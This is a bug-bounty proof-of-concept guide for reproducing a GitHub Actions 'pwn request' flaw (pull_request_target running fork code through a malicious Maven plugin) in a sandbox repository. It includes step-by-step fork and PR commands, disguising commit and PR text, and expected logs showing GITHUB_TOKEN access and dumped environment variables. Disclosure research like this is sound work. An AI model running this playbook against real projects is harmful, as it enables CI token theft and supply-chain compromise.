# PWN Request POC Instructions for alloydb-java-connector Vulnerability

## Setup Complete ✅

The base repository at https://github.com/zhengg2/shiny-winner-sandbox has been configured with:

1. ✅ **Vulnerable workflow** (`.github/workflows/tests.yml`)
   - Uses `pull_request_target` trigger
   - Has **INVERTED condition logic** (fork PRs run automatically!)
   - Grants `contents: write` and `pull-requests: write` permissions

2. ✅ **Legitimate Maven project**
   - Basic Java connector class
   - Unit tests
   - Clean pom.xml (no malicious code)

3. ✅ **Malicious pom.xml** (in `POC-ATTACK/pom.xml`)
   - Contains exec-maven-plugin for code execution
   - Demonstrates vulnerability without causing harm
   - Shows GITHUB_TOKEN access and environment variables

---

## Option 1: Create Attack PR from Another Account (Recommended)

This simulates a real-world attack scenario.

### Step 1: Fork Repository (from different account)

**Using GitHub Web Interface:**
1. Log into a different GitHub account (not zhengg2)
2. Visit: https://github.com/zhengg2/shiny-winner-sandbox
3. Click "Fork" button
4. Wait for fork to complete

**Or using gh CLI (if you have another account configured):**
```bash
# Switch to different account
gh auth switch

# Fork the repository
gh repo fork zhengg2/shiny-winner-sandbox --clone
```

### Step 2: Replace pom.xml with Malicious Version

```bash
# In your fork directory
cd shiny-winner-sandbox

# Replace pom.xml with malicious version
cp POC-ATTACK/pom.xml pom.xml

# Create feature branch
git checkout -b fix/improve-error-handling

# Commit changes
git add pom.xml
git commit -m "Fix: Improve error handling in database connector

This PR improves error handling when connection fails:
- Better exception messages
- Retry logic for transient failures
- Logging improvements

Please review and merge. Tests should pass automatically."

# Push to your fork
git push origin fix/improve-error-handling
```

### Step 3: Create Pull Request

```bash
# Create PR targeting zhengg2/shiny-winner-sandbox
gh pr create \
  --repo zhengg2/shiny-winner-sandbox \
  --title "Fix: Improve error handling in database connector" \
  --body "## Description

This PR improves error handling in the DatabaseConnector class.

## Changes
- Enhanced error messages
- Added retry logic for failed connections
- Improved logging for debugging

## Testing
The CI workflow will run automatically to verify all tests pass.

## Checklist
- [x] Code follows project conventions
- [x] Tests pass locally
- [x] Documentation updated"
```

### Step 4: Watch Workflow Execute

**The workflow will trigger AUTOMATICALLY** (no label needed!) because:
- The condition is: `github.event.pull_request.head.repo.full_name != github.repository`
- For fork PRs, this evaluates to TRUE
- Workflow runs immediately with full permissions

**To view the execution:**
```bash
# List workflow runs
gh run list --repo zhengg2/shiny-winner-sandbox --workflow=tests.yml

# Watch the latest run
gh run watch --repo zhengg2/shiny-winner-sandbox

# View logs once complete
gh run view <run-id> --repo zhengg2/shiny-winner-sandbox --log
```

**Expected Output in Logs:**
```
🔴 PWN REQUEST POC: alloydb-java-connector vulnerability
✅ VULNERABILITY CONFIRMED:
   - Arbitrary Maven plugin executed from fork PR
   - NO label required (inverted logic in workflow condition)
   - Automatic trigger on PR submission

🔑 GITHUB_TOKEN ACCESS:
   ✅ GITHUB_TOKEN is accessible
   Token (first 20 chars): ghs_xxxxxxxxxxxxx...

📦 REPOSITORY PERMISSIONS:
   - contents: write (can modify repository)
   - pull-requests: write (can modify PRs)
   - id-token: write (can access OIDC token for GCP)

🎯 SEVERITY: CRITICAL (CVSS 9.6)
```

---

## Option 2: Simulate Fork PR from Same Account (Alternative)

If you don't have a second account, you can simulate the attack using a branch in the same repo.

**Note:** This doesn't perfectly replicate the vulnerability (since it's not a real fork), but it demonstrates the Maven plugin execution.

### Step 1: Create Attack Branch

```bash
cd /Users/phenggeler/workspace/bugbounty/shiny-winner-sandbox

# Create new branch simulating a fork
git checkout -b attack/poc-from-fork

# Replace pom.xml
cp POC-ATTACK/pom.xml pom.xml

# Commit
git add pom.xml
git commit -m "POC: Demonstrate PWN Request vulnerability

This commit demonstrates the alloydb-java-connector PWN Request vulnerability
by adding a malicious exec-maven-plugin to pom.xml.

This POC shows that fork PRs can execute arbitrary code via Maven plugins
when the workflow uses pull_request_target with fork checkout."

# Push branch
git push origin attack/poc-from-fork
```

### Step 2: Create PR from Branch

```bash
# Create PR
gh pr create \
  --base main \
  --head attack/poc-from-fork \
  --title "POC: PWN Request Vulnerability Demonstration" \
  --body "## ⚠️ SECURITY POC ⚠️

This PR demonstrates the PWN Request vulnerability in workflows using:
- \`pull_request_target\` trigger
- Fork code checkout
- Inverted condition logic (fork PRs run automatically)

## Vulnerability Details

The workflow condition:
\`\`\`yaml
if: |
  github.event.pull_request.head.repo.full_name != github.repository ||
  contains(github.event.pull_request.labels.*.name, 'tests: run')
\`\`\`

This means fork PRs **ALWAYS run** without requiring a label.

## POC Impact

The malicious pom.xml will:
- Execute arbitrary bash commands via exec-maven-plugin
- Display GITHUB_TOKEN (first 20 chars)
- Show environment variables
- Demonstrate repository write access

## Expected Result

Workflow runs automatically and shows:
- ✅ Code execution confirmed
- ✅ GITHUB_TOKEN access confirmed
- ✅ No label required
- ✅ CVSS 9.6 (CRITICAL)

**This is a non-malicious POC for responsible disclosure.**"
```

**⚠️ Limitation:** This approach won't fully test the fork condition since the branch is in the same repo, but it will demonstrate the Maven plugin execution.

---

## Option 3: Quick Test Without PR (Local Simulation)

You can test the Maven plugin locally to verify it works:

```bash
cd /Users/phenggeler/workspace/bugbounty/shiny-winner-sandbox

# Backup original pom.xml
cp pom.xml pom.xml.backup

# Use malicious pom.xml
cp POC-ATTACK/pom.xml pom.xml

# Run Maven validate phase (triggers malicious plugin)
mvn validate

# Restore original
mv pom.xml.backup pom.xml
```

This will show the POC output locally, proving the attack vector works.

---

## Verification Checklist

After creating the PR, verify:

- [ ] Workflow triggers automatically (check Actions tab)
- [ ] No label was added or required
- [ ] Workflow runs in `pull_request_target` context
- [ ] Logs show "PWN REQUEST POC" banner
- [ ] GITHUB_TOKEN is accessible (first 20 chars shown)
- [ ] Environment variables are dumped
- [ ] Workflow has write permissions confirmed

---

## Expected Timeline

| Time | Event |
|------|-------|
| T+0 | Submit PR from fork |
| T+5s | GitHub Actions detects PR |
| T+10s | Workflow triggers (pull_request_target) |
| T+30s | Code checked out from fork |
| T+45s | Maven validate phase begins |
| **T+60s** | **Malicious exec-maven-plugin executes** |
| **T+61s** | **POC banner displayed in logs** |
| **T+62s** | **GITHUB_TOKEN accessed and shown** |
| T+90s | Workflow completes |

**Total exploitation time:** ~90 seconds

---

## Evidence Collection

After the POC runs successfully:

1. **Capture Workflow Run URL**
   ```bash
   gh run list --repo zhengg2/shiny-winner-sandbox --workflow=tests.yml --limit 1
   ```

2. **Save Logs**
   ```bash
   gh run view <run-id> --repo zhengg2/shiny-winner-sandbox --log > poc-logs.txt
   ```

3. **Take Screenshots**
   - Workflow run page showing automatic trigger
   - Logs showing POC output
   - GITHUB_TOKEN access confirmation
   - No label required

4. **Document for Report**
   - PR URL
   - Workflow run URL
   - Log excerpts showing exploitation
   - Timestamp of automatic trigger

---

## Cleanup

After successful POC:

```bash
# Close the PR
gh pr close <pr-number> --repo zhengg2/shiny-winner-sandbox

# Delete fork (if you created one)
gh repo delete <your-username>/shiny-winner-sandbox

# Or delete branch (if Option 2)
git push origin --delete attack/poc-from-fork
git branch -D attack/poc-from-fork
```

---

## Next Steps

Once POC is confirmed:

1. ✅ Attach evidence to Google VRP submission
2. ✅ Reference workflow run URL in report
3. ✅ Highlight inverted condition logic
4. ✅ Emphasize CRITICAL severity (no label required)
5. ✅ Compare to github/opensource.guide (same CVSS 9.6)

---

## Files Created

- `.github/workflows/tests.yml` - Vulnerable workflow (committed to main)
- `pom.xml` - Legitimate version (committed to main)
- `src/main/java/com/example/connector/DatabaseConnector.java` - Sample code
- `src/test/java/com/example/connector/DatabaseConnectorTest.java` - Sample tests
- `POC-ATTACK/pom.xml` - Malicious version for demonstration
- `POC-ATTACK/INSTRUCTIONS.md` - This file

---

## Important Notes

✅ **This is a non-malicious POC** for responsible disclosure research
❌ **Do not** exfiltrate real secrets or tokens
❌ **Do not** modify the repository maliciously
❌ **Do not** create persistent backdoors
✅ **Do** collect evidence for responsible disclosure
✅ **Do** submit findings to Google VRP

**Ready to execute the POC!** Choose Option 1 (recommended) or Option 2 (if no second account available).
